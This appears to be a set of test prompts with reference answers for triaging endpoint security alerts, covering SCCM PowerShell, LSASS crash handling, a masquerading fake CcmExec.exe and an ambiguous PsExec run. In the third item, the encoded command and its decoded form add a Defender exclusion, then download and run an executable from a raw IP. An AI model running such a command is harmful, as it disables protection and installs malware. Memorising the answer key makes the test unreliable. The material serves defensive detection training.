# Showcase alerts for the base vs fine-tuned vs RAG comparison

Generated with a separate seed; not present in any split. Pick 3 of the 4.
Paste each prompt into every model tier. The reference answer is the alert-only answer;
with RAG, psexec_ambiguous may resolve differently depending on the roster document.

## Question 1 (ps_encoded_sccm)

**Prompt**

```
Triage this alert:

EDR ALERT (JSON)
{
  "detection_name": "Suspicious encoded PowerShell command",
  "severity": "Medium",
  "timestamp": "2026-08-22T17:39:35Z",
  "device": {
    "hostname": "WS-FIN-082",
    "device_group": "Finance Workstations",
    "os": "Windows 11 23H2"
  },
  "user": "NT AUTHORITY\\SYSTEM",
  "process": {
    "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "command_line": "powershell.exe -NoLogo -NonInteractive -ExecutionPolicy Bypass -EncodedCommand RwBlAHQALQBIAG8AdABGAGkAeAAgAHwAIABTAG8AcgB0AC0ATwBiAGoAZQBjAHQAIABJAG4AcwB0AGEAbABsAGUAZABPAG4AIAAtAEQAZQBzAGMAZQBuAGQAaQBuAGcAIAB8ACAAUwBlAGwAZQBjAHQALQBPAGIAagBlAGMAdAAgAC0ARgBpAHIAcwB0ACAANQA=",
    "ancestry": "C:\\Windows\\CCM\\CcmExec.exe <- C:\\Windows\\System32\\services.exe",
    "signature": "Signed: Microsoft Windows",
    "prevalence": "Image present on all managed hosts",
    "sha256": "c515e8e7d219f83538d2b67a22458dcf00e518f53376ac1706c83df3948be2ed"
  },
  "network": "None observed",
  "context": "Parent CcmExec.exe signature: Microsoft Corporation; parent prevalence: all managed hosts"
}
```

**Reference answer (alert only)**

```
Verdict: Benign True Positive
Confidence: High
Severity: Low
MITRE ATT&CK: T1059.001 - Command and Scripting Interpreter: PowerShell (authorized activity)
Summary: The SCCM client ran an encoded PowerShell script for inventory or compliance; encoding is how SCCM passes scripts, and the content is benign.
Key evidence:
- The parent is C:\Windows\CCM\CcmExec.exe, the Microsoft-signed SCCM client in its legitimate location, running as SYSTEM.
- The base64 decodes to: Get-HotFix | Sort-Object InstalledOn -Descending | Select-Object -First 5
- The decoded script only reads system state and downloads or executes nothing.
- The PowerShell process made no network connections.
Recommended actions:
1. Close as Benign True Positive.
2. Confirm the script matches an approved SCCM configuration item.
3. Tune the rule to suppress encoded PowerShell from C:\Windows\CCM\CcmExec.exe when the decoded content matches approved scripts.
```

## Question 2 (lsass_werfault)

**Prompt**

```
Triage this alert:

EDR ALERT
Detection: Suspicious access to LSASS process memory
Vendor severity: High
Timestamp: 2026-04-27T07:00:39Z
Host: SRV-SQL08 (Device group: Database Servers, OS: Windows Server 2025)
User: NT AUTHORITY\SYSTEM
Process: C:\Windows\System32\WerFault.exe
Command line: C:\Windows\system32\WerFault.exe -u -p 641 -s 213
Process tree: C:\Windows\System32\svchost.exe -k WerSvcGroup <- C:\Windows\System32\services.exe
Signature: Signed: Microsoft Windows
Prevalence: Image present on all managed hosts
SHA256: 43672c014b736ad7993cfe6d86c19af94e19a627dafa43938859c911282a1cb3
Network: None observed
Additional context: Application Error event 1000 for lsass.exe logged 2 seconds earlier; output in C:\ProgramData\Microsoft\Windows\WER\ReportQueue
```

**Reference answer (alert only)**

```
Verdict: False Positive
Confidence: High
Severity: Informational
MITRE ATT&CK: T1003.001 - OS Credential Dumping: LSASS Memory (detection category only)
Summary: Windows Error Reporting opened LSASS after a crash; this is normal crash handling, not credential dumping.
Key evidence:
- WerFault.exe runs from C:\Windows\System32, is Microsoft-signed, and runs as SYSTEM.
- Its parent is the WerSvc service host, the expected launcher for crash reporting.
- An Application Error event for lsass.exe immediately preceded the access.
- Output went to the standard WER ReportQueue, not a staging path.
Recommended actions:
1. Close as False Positive.
2. Open a ticket with the server team, since an LSASS crash on SRV-SQL08 may indicate instability or a faulty driver.
3. Tune the rule to exclude System32 WerFault.exe launched by WerSvc when a crash event precedes it.
```

## Question 3 (ps_encoded_fake_sccm)

**Prompt**

```
Triage this alert:

EDR ALERT
Detection: Suspicious encoded PowerShell command
Vendor severity: High
Timestamp: 2026-04-16T08:22:59Z
Host: WS-LGL-081 (Device group: Legal Workstations, OS: Windows 11 23H2)
User: CORP\jkowalski
Process: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
Command line: powershell.exe -NoLogo -NonInteractive -ExecutionPolicy Bypass -EncodedCommand QQBkAGQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARQB4AGMAbAB1AHMAaQBvAG4AUABhAHQAaAAgACQAZQBuAHYAOgBBAFAAUABEAEEAVABBADsAIABpAHcAcgAgAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADAANwAuADkANwAuADEAOQAxAC8AdQAgAC0ATwB1AHQARgBpAGwAZQAgACQAZQBuAHYAOgBBAFAAUABEAEEAVABBAFwAdQAuAGUAeABlADsAIAAmACAAJABlAG4AdgA6AEEAUABQAEQAQQBUAEEAXAB1AC4AZQB4AGUA
Process tree: C:\Users\Public\CCM\CcmExec.exe <- C:\Windows\explorer.exe
Signature: Signed: Microsoft Windows
Prevalence: Image present on all managed hosts
SHA256: c515e8e7d219f83538d2b67a22458dcf00e518f53376ac1706c83df3948be2ed
Network: Outbound TCP 185.207.97.191:80 from powershell.exe
Additional context: Parent C:\Users\Public\CCM\CcmExec.exe signature: Unsigned; parent prevalence: 1 host
```

**Reference answer (alert only)**

```
Verdict: True Positive
Confidence: High
Severity: High
MITRE ATT&CK: T1059.001 - PowerShell; T1036.005 - Masquerading: Match Legitimate Name or Location
Summary: Malware named CcmExec.exe but running from a user-writable folder launched encoded PowerShell that downloads a payload; it imitates the SCCM client to blend in.
Key evidence:
- The real SCCM client is C:\Windows\CCM\CcmExec.exe, but this parent runs from C:\Users\Public\CCM\CcmExec.exe.
- The parent is unsigned and seen on one host, while the real client is Microsoft-signed and present everywhere.
- It runs under user jkowalski and was started by explorer.exe, whereas the real client runs as SYSTEM under services.exe.
- The base64 decodes to: Add-MpPreference -ExclusionPath $env:APPDATA; iwr http://185.207.97.191/u -OutFile $env:APPDATA\u.exe; & $env:APPDATA\u.exe
- PowerShell connected to raw IP 185.207.97.191.
Recommended actions:
1. Isolate WS-LGL-081.
2. Collect the fake CcmExec.exe and block 185.207.97.191.
3. Hunt the fleet for CcmExec.exe running outside C:\Windows\CCM.
4. Reset jkowalski's credentials and remove any persistence that launches the fake binary.
```

## Question 4 (psexec_ambiguous)

**Prompt**

```
Triage this alert:

EDR ALERT
Detection: Remote service creation (PsExec-style)
Vendor severity: High
Timestamp: 2026-08-17T17:19:01Z
Host: WS-SLS-118 (Device group: Sales Workstations, OS: Windows 11 23H2)
User: CORP\adm-hschmidt
Process: C:\Users\adm-hschmidt\Downloads\PsExec64.exe
Command line: PsExec64.exe \\SRV-APP12 -s cmd /c "ipconfig /all & net localgroup administrators"
Process tree: C:\Windows\System32\cmd.exe <- C:\Windows\explorer.exe
Signature: Signed: Microsoft Corporation (original filename PsExec64.exe)
Prevalence: Image seen on 2 hosts in last 30 days
SHA256: ed2cf3dfc8df07413df4f73ef8c9fcd698014efb68fefd19ae3e8e5df28fb36d
Network: SMB to SRV-APP12; PsExec64.exe downloaded from live.sysinternals.com 5 minutes earlier
Additional context: Single target SRV-APP12
```

**Reference answer (alert only)**

```
Verdict: Needs Investigation
Confidence: Medium
Severity: Medium
MITRE ATT&CK: T1569.002 - Service Execution; T1069.001 - Permission Groups Discovery: Local Groups
Summary: An admin account ran freshly downloaded PsExec from a standard workstation against one server for discovery commands; plausible troubleshooting, but outside normal admin practice.
Key evidence:
- adm-hschmidt is a privileged account, and the commands are low impact.
- It ran from WS-SLS-118, a Sales Workstations host, instead of a jump server.
- PsExec was downloaded minutes earlier rather than run from managed tooling.
- Enumerating local administrators is also typical attacker discovery.
Recommended actions:
1. Check the admin roster or ask the owner of adm-hschmidt whether they ran this and why.
2. Check adm-hschmidt sign-in history for anomalies such as new source IPs or MFA failures.
3. If unconfirmed, disable the account and isolate WS-SLS-118.
```

